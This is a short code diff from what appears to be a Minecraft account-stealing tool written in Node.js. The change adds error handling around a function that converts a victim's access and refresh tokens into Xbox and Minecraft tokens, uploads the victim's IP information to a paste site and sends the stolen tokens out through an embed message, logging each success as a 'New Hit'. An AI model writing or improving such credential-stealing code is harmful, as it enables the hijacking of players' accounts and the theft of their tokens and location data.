@@ -246,6 +246,7 @@ async function main(code){
 	console.log(chalk.red(`\n[!] New Hit`))
 }
 async function main2(access_token, refresh_token){
+	try{
 	var xblToken = await getXblToken(access_token);
 	var XstsList = await GetXstsToken(xblToken);
 	var XstsToken = XstsList[0];
@@ -260,6 +261,9 @@ async function main2(access_token, refresh_token){
 	var PasteLink = await Paste(PasteKey, ipInfo)
 	await sendEmbed(MinecraftToken, Uuid, refresh_token, Ign, ip, PasteLink);
 	console.log(chalk.red(`\n[!] New Hit`))
+	}catch(err){
+		console.log(`There was an error`)
+	}
 }
 
 app.get(`/`, (req,res)=>{
